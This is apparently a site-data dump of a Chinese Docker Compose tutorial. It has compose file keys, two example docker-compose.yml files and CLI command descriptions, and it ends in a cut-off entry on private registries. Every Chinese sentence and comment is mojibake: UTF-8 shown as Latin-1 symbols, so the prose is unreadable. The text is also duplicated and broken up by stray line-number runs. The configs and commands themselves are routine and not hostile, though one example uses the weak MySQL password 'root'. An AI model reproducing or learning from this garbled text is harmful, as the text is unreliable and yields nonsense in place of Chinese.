true\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n\n# ç¤ºä¾ 2\n\n### æå®çæ¬ï¼çæ¬çå³ç³»åDocker å¼ææå³\n### https://docs.docker.com/compose/compose-file/compose-file-v3/#profiles çæ¬å³ç³»åè¯´æ\nversion: \'3.7\'\n\n### æå®æå¡\nservices:\n  ### æå¡åç§° å¯ä¸\n  monitor-web-server-service:\n    ### æå»ºéåçé¡¹ç®è·¯å¾\n    build:\n      ### æå®ä¸ä¸æè·¯å¾ï¼é»è®¤æ¯å¾®æå¡é¡¹ç®çæ ¹ç®å½\n      context: ./monitor-web/monitor-web-server/\n      ### æå®\n      dockerfile: monitor-web-server-service\n    ### æå®éååç§°\n    image: monitor-web-server-service\n    ### .envçç¯å¢åé\n    env_file:\n      - ./.env\n    ### ç½ç»éç½®\n    networks:\n      - internal_access\n      - external_access ### db access\n\n  monitor-web-socket-service:\n    build: ./monitor-web/monitor-web-socket/monitor-web-socket-service\n    image: boboweike/monitor-web-socket-service\n    env_file:\n      - ./.env\n    ### ä¾èµçé¡¹ç®ï¼å¯å¨çæ¶åæ ¹æ®ä¾èµå³ç³»å®ä¹å¯å¨é¡ºåº\n    depends_on:\n      - monitor-web-server-service\n    networks:\n      - internal_access\n      - external_access ### db access\n\n  monitor-gateway:\n    build: ./monitor-gateway\n    image: boboweike/monitor-gateway\n    ### è®¾ç½®åé¨åå¤é¨ç«¯å£\n    ports:\n    - 80:80\n    env_file:\n      - ./.env\n    ### ä¾èµçé¡¹ç®ï¼å¯å¨çæ¶åæ ¹æ®ä¾èµå³ç³»å®ä¹å¯å¨é¡ºåº\n    depends_on:\n      - monitor-web-server-service\n      - monitor-web-server-service\n    networks:\n      - internal_access\n      - external_access\n    ### å¿è·³æ£æ¥\n    healthcheck:\n      ### è®¿é® monitor-gateway ç½å³çå½ä»¤\n      test: [ "CMD","curl","-f","http://localhost:80" ]\n      ### é´éæ¶é´\n      interval: 1m30s\n      ### è¶æ¶æ¶é´\n      timeout: 10s\n      ### éè¯æ¬¡æ°\n      retries: 3\n\n  mysql:\n    image: mysql:5.7.32\n    container_name: mysql\n    ports:\n      - "3306:3306"\n    volumes:\n      - mysqldata:/var/lib/mysql\n      - mysqlconf:/etc/mysql\n    env_file:\n      - ./mysql.env\n    networks:\n      - external_access\n    ### ä¿®æ¹åæ ¸åæ°ï¼ä¹å¯ä»¥æ¯æ°ç»çæ¹å¼\n    sysctls:\n      net.core.somaxconn: 1024\n      net.ipv4.tcp_syncookies: 0\n    ### æå®å®¹å¨ç ulimits éå¶å¼ï¼ä¾å¦ ï¼\n    ulimits:\n      ### æå®æå¤§è¿ç¨æ°ä¸º 65535\n      nproc: 65535\n      ### æå®æä»¶å¥ææ°ä¸º\n      nofile:\n        ### è½¯éå¶ 200000ï¼è½¯éå¶ï¼åºç¨å¯ä»¥éæ¶ä¿®æ¹ï¼ä¸è½è¶è¿ç¡¬éå¶ï¼\n        soft: 20000\n        ### ç¡¬éå¶ï¼ç³»ç»ç¡¬éå¶ï¼åªè½rootç¨æ·æé«ï¼\n        hard: 40000\n\n\n  myaccount-service:\n    build:\n      context: ./frontend\n      dockerfile: myaccount/Dockerfile\n    image: boboweike/myaccount-spa\n    networks:\n      - internal_access\n\n\nnetworks:\n  internal_access:\n    internal: true\n  external_access:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n\n\n\n# Compose æä»¤\n\nå¯¹äº Compose æ¥è¯´ï¼å¤§é¨åå½ä»¤çå¯¹è±¡æ¢å¯ä»¥æ¯é¡¹ç®æ¬èº«ï¼ä¹å¯ä»¥æå®ä¸ºé¡¹ç®ä¸­çæå¡æèå®¹å¨ãå¦ææ²¡æç¹å«çè¯´æï¼å½ä»¤å¯¹è±¡å°æ¯é¡¹ç®ï¼è¿æå³çé¡¹ç®ä¸­ææçæå¡é½ä¼åå°å½±åã\n\ndocker-compose [-f=<arg>...] [options] [COMMAND] [ARGS...]\n\n\n1\n\n\n\n# å½ä»¤éé¡¹\n\n * -f -> --file FILE æå®ä½¿ç¨ç Compose æ¨¡æ¿ææä»¶ï¼é»è®¤ä¸º docker-compose.ymlï¼å¯ä»¥å¤æ¬¡æå®ã\n * -p -> --project-name NAME æå®é¡¹ç®åç§°ï¼é»è®¤å°ä½¿ç¨æå¨ç®å½åç§°ä½ä¸ºé¡¹ç®å\n * --x-networking ä½¿ç¨ Docker å¯ææç½ç»åç«¯ç¹æ§\n * --verbose è¾åºæ´å¤è°è¯ä¿¡æ¯ã\n * -v -> --version æå°çæ¬å¹¶éåºã\n\n\n# å½ä»¤ä½¿ç¨è¯´æ\n\n# up\n\ndocker-compose up [options] [SERVICE...]\n\n\n1\n\n * è¯¥å½ä»¤ååå¼ºå¤§ï¼å®å°å°è¯èªå¨å®æåæ¬æå»ºéåï¼ï¼éæ°ï¼åå»ºæå¡ï¼å¯å¨æå¡ï¼å¹¶å³èæå¡ç¸å³å®¹å¨çä¸ç³»åæä½ã\n * è¿æ¥çæå¡é½å°ä¼è¢«èªå¨å¯å¨ï¼é¤éå·²ç»å¤äºè¿è¡ç¶æ\n * å¤§é¨åçæ¶åé½å¯ä»¥ç´æ¥éè¿è¯¥å½ä»¤æ¥å¯å¨ä¸ä¸ªé¡¹ç®ã\n * é»è®¤æåµï¼docker-compose up å¯å¨çå®¹å¨é½å¨åå°ï¼æ§å¶å°å°ä¼åæ¶æå°ææå®¹å¨çè¾åºä¿¡æ¯ï¼å¯ä»¥å¾æ¹ä¾¿è¿è¡è°è¯ã\n * å½éè¿ Ctrl-c åæ­¢å½ä»¤æ¶ï¼ææå®¹å¨å°ä¼åæ­¢\n * å¦æä½¿ç¨ docker-compose up -dï¼å°ä¼ååå°å¯å¨å¹¶è¿è¡ææçå®¹å¨ï¼ä¸è¬æ¨èçäº§ç¯å¢ä¸ä½¿ç¨è¯¥éé¡¹ã\n * é»è®¤æåµï¼å¦ææå¡å®¹å¨å·²ç»å­å¨ï¼docker-compose up å°ä¼å°è¯åæ­¢å®¹å¨ï¼ç¶åéæ°åå»ºï¼ä¿æä½¿ç¨ volumes-from æè½½çå·ï¼ï¼ä»¥ä¿è¯æ°å¯å¨çæå¡å¹é docker-compose.yml æä»¶çææ°åå®¹ã\n\n# down\n\ndocker-compose down\n\n\n1\n\n\næ­¤å½ä»¤å°ä¼åæ­¢ up å½ä»¤æå¯å¨çå®¹å¨ï¼å¹¶ç§»é¤ç½ç»\n\n# exec\n\ndocker-compose exec æå¡å\n\n\n1\n\n\nè¿å¥æå®çå®¹å¨\n\n# ps\n\ndocker-compose ps [options] [SERVICE...]\n\n\n1\n\n\nååºé¡¹ç®ä¸­ç®åçææå®¹å¨ã\n\n * -q ï¼å¯ä»¥ä»¥æå°å®¹å¨ç ID ä¿¡æ¯\n\n# restart\n\ndocker-compose restart [options] [service...]\n\n\n1\n\n\néå¯é¡¹ç®ä¸­çæå¡ï¼éé¡¹ -t æå®éå¯ååæ­¢å®¹çè¶æ¶æ¶é´ï¼é»è®¤ 10sï¼\n\n# rm\n\ndocker-compose rm [options] [service...]\n\n\n1\n\n\nå é¤ææï¼åæ­¢ç¶æçï¼æå¡å®¹å¨ãæ¨èåæ§è¡ docker-compose stop å½ä»¤æ¥åæ­¢å®¹å¨ã\n\n * -f å¼ºå¶ç´æ¥å é¤ï¼åæ¬éåæ­¢ç¶æçå®¹å¨ãä¸è¬å°½éä¸è¦ä½¿ç¨è¯¥éé¡¹ã\n * -v å é¤å®¹å¨ææè½½çæ°æ®å·ã\n\n# start\n\ndocker-compose start [service...]\n\n\n1\n\n\nå¯å¨å·²ç»å­å¨çæå¡å®¹å¨\n\n# stop\n\ndocker-compose stop [options] [service...]\n\n\n1\n\n\nåæ­¢å·²ç»å¤äºè¿è¡ç¶æçå®¹å¨ï¼ä½ä¸å é¤å®ãéè¿ docker-compose start å¯ä»¥åæ¬¡å¯å¨è¿äºå®¹å¨\n\n * -t åæ­¢å®¹å¨çè¶æ¶æ¶é´ï¼é»è®¤ä¸º 10sï¼\n\n# top\n\ndocker-compose top\n\n\n1\n\n\næ¥çåä¸ªæå¡å®¹å¨åè¿è¡çè¿ç¨ã\n\n# pause,unpause\n\ndocker-compose pause [service...]\n\n\n1\n\n\næåå¤äºè¿è¡ä¸­çæå¡ã\n\ndocker-compose unpause [service...]\n\n\n1\n\n\næ¢å¤å¤äºæåç¶æä¸­çæå¡ã\n\n# logs\n\ndocker-compose logs [service...]\n\n\n1\n\n\næ¥çæä¸ªæå¡çæ¥å¿',normalizedContent:'# ç®ä»\n\ncompose é¡¹ç®æ¯ docker å®æ¹çå¼æºé¡¹ç®ï¼è´è´£å®ç°å¯¹ docker å®¹å¨éç¾¤çå¿«éç¼æï¼å¸®å©å®ä¹åè¿è¡å¤ä¸ª docker å®¹å¨çåºç¨ï¼å¶åèº«æ¯å¼æºé¡¹ç® figãæè°ç¼æå°±æ¯è½æä¸ä¸ªé¡¹ç®çä¾èµï¼å¦ mysqlï¼redisï¼æå¡é´çä¾èµç­ï¼æç§æåºçæ¹å¼å¯å¨å®¹å¨\n\ndockerfile å¯ä»¥è®©ç¨æ·å¾æ¹ä¾¿çå®ä¹ä¸ä¸ªåç¬çåºç¨å®¹å¨ï¼ç¶èå¨æ¥å¸¸å·¥ä½ä¸­ä»¬ç»å¸¸ä¼ç¢°å°éè¦å¤ä¸ªå®¹å¨ç¸äºéåæ¥å®ææé¡¹ä»»å¡çæåµãä¾å¦è¦å®ç°ä¸ä¸ª web é¡¹ç®ï¼é¤äº web æå¡å®¹å¨æ¬èº«ï¼å¾å¾è¿éè¦åå ä¸åç«¯çæ°æ®åºæå¡å¨å®¹å¨ï¼çè³è¿åæ¬è´è½½åè¡¡å®¹å¨ç­ã\n\ncompose æ°å¥½æ»¡è¶³äºè¿æ ·çéæ±ï¼å®åè®¸éè¿ä¸ä¸ªåç¬ç docker-compose.yml æ¨¡æ¿æä»¶ï¼æ¥å®ä¹ä¸ç»ç¸å³èçåºç¨å®¹å¨ä¸ºä¸ä¸ªé¡¹ç®ã\n\ncompose ä¸­æä¸¤ä¸ªéè¦çæ¦å¿µ\n\n 1. æå¡ï¼serviceï¼ï¼ä¸ä¸ªåºç¨çå®¹å¨ï¼å®éä¸å¯ä»¥åæ¬è¥å¹²è¿è¡ç¸åéåçå®¹å¨å®ä¾ã\n 2. é¡¹ç®ï¼projectï¼ï¼ç±ä¸ç»å³èçåºç¨å®¹å¨ç»æçä¸ä¸ªå®æ´ä¸å¡ååï¼å docker-compose.yml æä»¶ä¸­å®ä¹ã\n\ncompose çé»è®¤ç®¡çå¯¹è±¡æ¯é¡¹ç®ï¼éè¿å­å½ä»¤å¯¹é¡¹ç®ä¸­çä¸ç»å®¹å¨è¿è¡ä¾¿æ·å°çå½å¨æç®¡çã\n\ncompose é¡¹ç®ç± python ç¼åï¼å®ç°ä¸è°ç¨äº docker æå¡æä¾ç api æ¥å¯¹å®¹å¨è¿è¡ç®¡çãå æ­¤ï¼åªè¦ææä½çå¹³å°æ¯æ docker apiï¼å°±å¯ä»¥åå¶ä¸å©ç¨ compose æ¥è¿è¡ç¼æç®¡çã\n\n\n# å®è£ä¸å¸è½½\n\nå®è£çè¯ï¼å¯ä»¥å®è£ docker desktop ï¼å®åå«äº docker ä»¥å compose å k8sï¼ä¹å¯ä»¥åç¬å®è£ï¼ä½å»ºè®®åäºè§£æ¸æ¥å®æ¹å¯¹ compose çä¸äºå®è£éå¶ãå®æ¹å°å\n\nlinux å®è£\n\nsudo curl -l "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose\nsudo chmod +x /usr/local/bin/docker-compose\ndocker-compose --version\n\n\n1\n2\n3\n\n\n\n# å½ä»¤\n\nå½ä»¤            æè¿°\nversion       çæ¬ç®å 4 ä»¥ä¸çé½å¯ä»¥åï¼å¦ 3.9ï¼3.8 ç­ï¼æå¥½ä¿æå docker çæ¬å¼å®¹\nservices      å¯ä»¥éé¢æè¿°ä½ çæææå¡ï¼ä»¥åä¾èµå³ç³»ç­\nimage         æå®ä¸ºéååç§°æéå idï¼å¦æéåå¨æ¬å°ä¸å­å¨ï¼compose å°ä¼å°è¯æåè¿ä¸ªéå\nports         æå®ä¸å®¿ä¸»æºä¸å®¹å¨æ å°çç«¯å£ï¼æ¯ä¸ä¸ªæ°ç»ï¼æ¯ä¸ªæ°ç»çåç´ å»ºè®®ç¨å­ç¬¦å½¢å¼ï¼å¦ "80:80"\nvolumes       æè½½è·¯å¾è®¾ç½®ï¼ç±»åä¸ºæ°ç»ï¼å¯ä»¥æè½½å¤ä¸ªï¼å¨å¶ä½å®¹å¨çæ¶åå¯ä»¥æ¾ç¤ºçå£°ææè½½è·¯å¾ï¼ä¹å¯ä»¥å¨å®¹å¨è¿è¡æ¶ç´æ¥ä½¿ç¨ -v å½ä»¤ã\nnetworks      éç½®å®¹å¨è¿æ¥çç½ç» docker network ls æ¥çç½ç»åè¡¨ï¼ docker network inspect\n              <container id> å¯ä»¥æ¥çå¯¹åºç½ç»çéç½®\nenvironment   è®¾ç½®ç¯å¢åéãä½ å¯ä»¥ä½¿ç¨æ°ç»æå­å¸ä¸¤ç§æ¹å¼\nenv_file      ä»æä»¶ä¸­è·åç¯å¢åéï¼å¯ä»¥ä¸ºåç¬çæä»¶è·¯å¾æåè¡¨ï¼æä»¶åå¿é¡»æ¯å­å¸æ¹å¼ç¼å\ncommand       è¦çå®¹å¨å¯å¨åé»è®¤æ§è¡çå½ä»¤\ndepends_on    è§£å³å®¹å¨çä¾èµãå¯å¨ååçé®é¢ï¼å¡«åçå¼ä¸º æå¡åï¼ä¼ç­ä¾èµçæå¡å¯å¨ä¸å®ç¨åº¦æå¯å¨èªå·±\nhealthcheck   éè¿å½ä»¤æ£æ¥å®¹å¨æ¯å¦çæ§è¿è¡\nsysctls       éç½®å®¹å¨åæ ¸åæ°ï¼å¦ es ç­é½éè¦ä¿®æ¹åæ ¸çç¯å¢åæ°\nulimits       æå®å®¹å¨ç ulimits éå¶å¼ï¼å¦ esãclickhouse ä¼æä¿®æ¹éæ±\nbuild         ç¨æ¥å°æå® dockerfile æåæå¯¹åºéåï¼ç¶ååè¿è¡è¯¥éå\n\nè¿äºå½ä»¤å¶å®å°±ç±»ä¼¼äºæä»¬å¨ docker ä¸­å¯å¨ä¸ä¸ªå®¹å¨çå½ä»¤ã\n\n\n# compose æä»¶ç¼å\n\n\n# ç¤ºä¾ 1\n\n### çæ¬\nversion: "3.2"\n\nservices:\n  ### æå¡åç§°\n  tomcat:\n    ### æå®å®¹å¨çåç§° ç¸å½äº --name\n    container_name: tomcat_1\n    ### ä½¿ç¨åªä¸ªéå ç¸å½äº docket run image\n    image: tomcat:8.0-jre8\n    ### æå®å®¿ä¸»æºä¸å®¹å¨ç«¯å£çæ å° ç¸å½äº -p\n    ports:\n      ### å®¿ä¸»æº:å®¹å¨\n      - "8080:8080"\n    ### å®¿ä¸»æºä¸å®¹å¨çæ°æ®å±äº« æè½½ç®å½ ç¸å½äº -v\n    volumes:\n      ### æ¹å¼1ï¼æå®ç»å¯¹æç¡®(ç»å¯¹è·¯å¾)çæè½½ç®å½\n      - /home/server:/user\n      ### æ¹å¼2ï¼å£°æäºèªå®åå»ºå·åçåé\n      - tomcatwebapps:/user\n    ### ä»£è¡¨å½åæå¡å¤äºé£ä¸ªç½ç»ï¼ä½ç¨æ¯ç½ç»éç¦»ç¨ï¼ä¼æç¸ç½ç»åç§°ç¸åçå®¹å¨çç½æ®µç»ä¸ãç¸å½äº --network\n    networks:\n      - group1\n\n  mysql:\n    image: mysql:5.7.32\n    container_name: mysql\n    ports:\n    - "3306:3306"\n    volumes:\n    - mysqldata:/var/lib/mysql\n    - mysqlconf:/etc/mysql\n    environment:\n      -mysql_root_password=root\n    networks:\n      group1\n\n\n### æè¿° æå¨å·éçåé\nvolumes:\n  ### æå®åé tomcatwebappsï¼å¦æä¸å externalï¼é»è®¤ä¼æ¯ docker-compose.yml æå¨å½åæä»¶å¤¹çåç§°(ä¼èªå¨åå»º)\n  tomcatwebapps:\n    ### ä½¿ç¨èªå®ä¹å·æ¯\n    external:\n      ### true ç¡®å®ä½¿ç¨æå®å·åï¼æ³¨æï¼ä¸æ¦ä½¿ç¨å¤é¨èªå®ä¹å·åï¼å¯å¨æå¡ä¹åå¿é¡»æå¨åå»º docker volume create å·å\n      false\n  mysqldata:\n  mysqlconf:\n\n### å®ä¹æå¡ç¨å°çç½ç»\nnetworks:\n  ### å®ä¹ä¸é¢çæå¡ç¨å°çç½ç»çåç§°ï¼é»è®¤æ¯é©±å¨å±äº bridgeï¼èªå®ä¹çç½ç»åç§° group1ï¼å¨å®éä¸­ä¼åä¸º é¡¹ç®å(ææå¨æä»¶ç®å½å)\n  group1:\n    ### ä½¿ç¨å¤é¨æå®çç½ç»ï¼ä¸º true å°±æ è¯ç½ç»å¿é¡»å­å¨\n    external:\n      ### docker network create -d bridge ç½ç»åç§°\n      true\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n\n# ç¤ºä¾ 2\n\n### æå®çæ¬ï¼çæ¬çå³ç³»ådocker å¼ææå³\n### https://docs.docker.com/compose/compose-file/compose-file-v3/#profiles çæ¬å³ç³»åè¯´æ\nversion: \'3.7\'\n\n### æå®æå¡\nservices:\n  ### æå¡åç§° å¯ä¸\n  monitor-web-server-service:\n    ### æå»ºéåçé¡¹ç®è·¯å¾\n    build:\n      ### æå®ä¸ä¸æè·¯å¾ï¼é»è®¤æ¯å¾®æå¡é¡¹ç®çæ ¹ç®å½\n      context: ./monitor-web/monitor-web-server/\n      ### æå®\n      dockerfile: monitor-web-server-service\n    ### æå®éååç§°\n    image: monitor-web-server-service\n    ### .envçç¯å¢åé\n    env_file:\n      - ./.env\n    ### ç½ç»éç½®\n    networks:\n      - internal_access\n      - external_access ### db access\n\n  monitor-web-socket-service:\n    build: ./monitor-web/monitor-web-socket/monitor-web-socket-service\n    image: boboweike/monitor-web-socket-service\n    env_file:\n      - ./.env\n    ### ä¾èµçé¡¹ç®ï¼å¯å¨çæ¶åæ ¹æ®ä¾èµå³ç³»å®ä¹å¯å¨é¡ºåº\n    depends_on:\n      - monitor-web-server-service\n    networks:\n      - internal_access\n      - external_access ### db access\n\n  monitor-gateway:\n    build: ./monitor-gateway\n    image: boboweike/monitor-gateway\n    ### è®¾ç½®åé¨åå¤é¨ç«¯å£\n    ports:\n    - 80:80\n    env_file:\n      - ./.env\n    ### ä¾èµçé¡¹ç®ï¼å¯å¨çæ¶åæ ¹æ®ä¾èµå³ç³»å®ä¹å¯å¨é¡ºåº\n    depends_on:\n      - monitor-web-server-service\n      - monitor-web-server-service\n    networks:\n      - internal_access\n      - external_access\n    ### å¿è·³æ£æ¥\n    healthcheck:\n      ### è®¿é® monitor-gateway ç½å³çå½ä»¤\n      test: [ "cmd","curl","-f","http://localhost:80" ]\n      ### é´éæ¶é´\n      interval: 1m30s\n      ### è¶æ¶æ¶é´\n      timeout: 10s\n      ### éè¯æ¬¡æ°\n      retries: 3\n\n  mysql:\n    image: mysql:5.7.32\n    container_name: mysql\n    ports:\n      - "3306:3306"\n    volumes:\n      - mysqldata:/var/lib/mysql\n      - mysqlconf:/etc/mysql\n    env_file:\n      - ./mysql.env\n    networks:\n      - external_access\n    ### ä¿®æ¹åæ ¸åæ°ï¼ä¹å¯ä»¥æ¯æ°ç»çæ¹å¼\n    sysctls:\n      net.core.somaxconn: 1024\n      net.ipv4.tcp_syncookies: 0\n    ### æå®å®¹å¨ç ulimits éå¶å¼ï¼ä¾å¦ ï¼\n    ulimits:\n      ### æå®æå¤§è¿ç¨æ°ä¸º 65535\n      nproc: 65535\n      ### æå®æä»¶å¥ææ°ä¸º\n      nofile:\n        ### è½¯éå¶ 200000ï¼è½¯éå¶ï¼åºç¨å¯ä»¥éæ¶ä¿®æ¹ï¼ä¸è½è¶è¿ç¡¬éå¶ï¼\n        soft: 20000\n        ### ç¡¬éå¶ï¼ç³»ç»ç¡¬éå¶ï¼åªè½rootç¨æ·æé«ï¼\n        hard: 40000\n\n\n  myaccount-service:\n    build:\n      context: ./frontend\n      dockerfile: myaccount/dockerfile\n    image: boboweike/myaccount-spa\n    networks:\n      - internal_access\n\n\nnetworks:\n  internal_access:\n    internal: true\n  external_access:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n\n\n\n# compose æä»¤\n\nå¯¹äº compose æ¥è¯´ï¼å¤§é¨åå½ä»¤çå¯¹è±¡æ¢å¯ä»¥æ¯é¡¹ç®æ¬èº«ï¼ä¹å¯ä»¥æå®ä¸ºé¡¹ç®ä¸­çæå¡æèå®¹å¨ãå¦ææ²¡æç¹å«çè¯´æï¼å½ä»¤å¯¹è±¡å°æ¯é¡¹ç®ï¼è¿æå³çé¡¹ç®ä¸­ææçæå¡é½ä¼åå°å½±åã\n\ndocker-compose [-f=<arg>...] [options] [command] [args...]\n\n\n1\n\n\n\n# å½ä»¤éé¡¹\n\n * -f -> --file file æå®ä½¿ç¨ç compose æ¨¡æ¿ææä»¶ï¼é»è®¤ä¸º docker-compose.ymlï¼å¯ä»¥å¤æ¬¡æå®ã\n * -p -> --project-name name æå®é¡¹ç®åç§°ï¼é»è®¤å°ä½¿ç¨æå¨ç®å½åç§°ä½ä¸ºé¡¹ç®å\n * --x-networking ä½¿ç¨ docker å¯ææç½ç»åç«¯ç¹æ§\n * --verbose è¾åºæ´å¤è°è¯ä¿¡æ¯ã\n * -v -> --version æå°çæ¬å¹¶éåºã\n\n\n# å½ä»¤ä½¿ç¨è¯´æ\n\n# up\n\ndocker-compose up [options] [service...]\n\n\n1\n\n * è¯¥å½ä»¤ååå¼ºå¤§ï¼å®å°å°è¯èªå¨å®æåæ¬æå»ºéåï¼ï¼éæ°ï¼åå»ºæå¡ï¼å¯å¨æå¡ï¼å¹¶å³èæå¡ç¸å³å®¹å¨çä¸ç³»åæä½ã\n * è¿æ¥çæå¡é½å°ä¼è¢«èªå¨å¯å¨ï¼é¤éå·²ç»å¤äºè¿è¡ç¶æ\n * å¤§é¨åçæ¶åé½å¯ä»¥ç´æ¥éè¿è¯¥å½ä»¤æ¥å¯å¨ä¸ä¸ªé¡¹ç®ã\n * é»è®¤æåµï¼docker-compose up å¯å¨çå®¹å¨é½å¨åå°ï¼æ§å¶å°å°ä¼åæ¶æå°ææå®¹å¨çè¾åºä¿¡æ¯ï¼å¯ä»¥å¾æ¹ä¾¿è¿è¡è°è¯ã\n * å½éè¿ ctrl-c åæ­¢å½ä»¤æ¶ï¼ææå®¹å¨å°ä¼åæ­¢\n * å¦æä½¿ç¨ docker-compose up -dï¼å°ä¼ååå°å¯å¨å¹¶è¿è¡ææçå®¹å¨ï¼ä¸è¬æ¨èçäº§ç¯å¢ä¸ä½¿ç¨è¯¥éé¡¹ã\n * é»è®¤æåµï¼å¦ææå¡å®¹å¨å·²ç»å­å¨ï¼docker-compose up å°ä¼å°è¯åæ­¢å®¹å¨ï¼ç¶åéæ°åå»ºï¼ä¿æä½¿ç¨ volumes-from æè½½çå·ï¼ï¼ä»¥ä¿è¯æ°å¯å¨çæå¡å¹é docker-compose.yml æä»¶çææ°åå®¹ã\n\n# down\n\ndocker-compose down\n\n\n1\n\n\næ­¤å½ä»¤å°ä¼åæ­¢ up å½ä»¤æå¯å¨çå®¹å¨ï¼å¹¶ç§»é¤ç½ç»\n\n# exec\n\ndocker-compose exec æå¡å\n\n\n1\n\n\nè¿å¥æå®çå®¹å¨\n\n# ps\n\ndocker-compose ps [options] [service...]\n\n\n1\n\n\nååºé¡¹ç®ä¸­ç®åçææå®¹å¨ã\n\n * -q ï¼å¯ä»¥ä»¥æå°å®¹å¨ç id ä¿¡æ¯\n\n# restart\n\ndocker-compose restart [options] [service...]\n\n\n1\n\n\néå¯é¡¹ç®ä¸­çæå¡ï¼éé¡¹ -t æå®éå¯ååæ­¢å®¹çè¶æ¶æ¶é´ï¼é»è®¤ 10sï¼\n\n# rm\n\ndocker-compose rm [options] [service...]\n\n\n1\n\n\nå é¤ææï¼åæ­¢ç¶æçï¼æå¡å®¹å¨ãæ¨èåæ§è¡ docker-compose stop å½ä»¤æ¥åæ­¢å®¹å¨ã\n\n * -f å¼ºå¶ç´æ¥å é¤ï¼åæ¬éåæ­¢ç¶æçå®¹å¨ãä¸è¬å°½éä¸è¦ä½¿ç¨è¯¥éé¡¹ã\n * -v å é¤å®¹å¨ææè½½çæ°æ®å·ã\n\n# start\n\ndocker-compose start [service...]\n\n\n1\n\n\nå¯å¨å·²ç»å­å¨çæå¡å®¹å¨\n\n# stop\n\ndocker-compose stop [options] [service...]\n\n\n1\n\n\nåæ­¢å·²ç»å¤äºè¿è¡ç¶æçå®¹å¨ï¼ä½ä¸å é¤å®ãéè¿ docker-compose start å¯ä»¥åæ¬¡å¯å¨è¿äºå®¹å¨\n\n * -t åæ­¢å®¹å¨çè¶æ¶æ¶é´ï¼é»è®¤ä¸º 10sï¼\n\n# top\n\ndocker-compose top\n\n\n1\n\n\næ¥çåä¸ªæå¡å®¹å¨åè¿è¡çè¿ç¨ã\n\n# pause,unpause\n\ndocker-compose pause [service...]\n\n\n1\n\n\næåå¤äºè¿è¡ä¸­çæå¡ã\n\ndocker-compose unpause [service...]\n\n\n1\n\n\næ¢å¤å¤äºæåç¶æä¸­çæå¡ã\n\n# logs\n\ndocker-compose logs [service...]\n\n\n1\n\n\næ¥çæä¸ªæå¡çæ¥å¿',charsets:{cjk:!0}},{title:"Dockerç§æåºçå¼å",frontmatter:{title:"Dockerç§æåºçå¼å",date:"2023-06-25T09:22:36.000Z",permalink:"/docker/402",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/40.Docker/402.Docker%E7%A7%81%E6%9C%89%E5%BA%93%E7%9A%84%E5%BC%80%E5%8F%91.html",relativePath:"04.è¿ç»´/40.Docker/402.Dockerç§æåºçå¼å.md",key:"v-d0de8634",path:"/docker/402/",headers:[{level:2,title:"åå¤",slug:"åå¤",normalizedTitle:"åå¤",charIndex:721},{level:3,title:"config.yml",slug:"config-yml",normalizedTitle:"config.yml",charIndex:1001},{level:2,title:"ä½¿ç¨ Docker Registry",slug:"ä½¿ç¨-docker-registry",normalizedTitle:"ä½¿ç¨ docker registry",charIndex:6398},{level:2,title:"è®¿é® Registry API",slug:"è®¿é®-registry-api",normalizedTitle:"è®¿é® registry api",charIndex:6773}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"åå¤ config.yml ä½¿ç¨ Docker Registry è®¿é® Registry API",content:'æ­£å¸¸æ¥è¯´æä»¬ä½¿ç¨å«äººçç§æåºå°±è¶³å¤äºï¼æ¯å¦ä½¿ç¨ Harborï¼å®å¯ä»¥å¸®æä»¬å¾å¥½çç®¡ç dockerï¼ä»¥åé¨ç½²ä¸ºç§ææå¬æåºç»ä¼ä¸æå¶ä»äººä½¿ç¨ï¼å¦ææ³å¼åä¸å¥é£ä¹éè¦äºè§£ docker ç¸å³ç APIï¼å¶ä¸­ dockerAPI åä¸ºå¦ä¸ä¸é¨åï¼\n\n * Docker Engine APIï¼Docker Engine API æ¯ Docker å¼æç API æ¥å£ï¼ç¨äºä¸ Docker å¼æè¿è¡éä¿¡åç®¡çãéè¿ Docker Engine APIï¼å¯ä»¥ç®¡çå®¹å¨ãéåãç½ç»ãå·ç­ Docker ç¸å³èµæºãå¯ä»¥ä½¿ç¨ Docker Engine API åå»ºãå¯å¨ãåæ­¢åå é¤å®¹å¨ï¼æå»ºåæ¨ééåï¼ä»¥åè¿è¡å®¹å¨åéåçç®¡çåçæ§ã\n * Docker Hub APIï¼Docker Hub API æ¯ä¸ Docker Hub äº¤äºç API æ¥å£ãDocker Hub æ¯ä¸ä¸ªå¬å±ç Docker éåä»åºï¼ç¨äºå­å¨ååäº« Docker éåãDocker Hub API åè®¸ç¨æ·éè¿ API 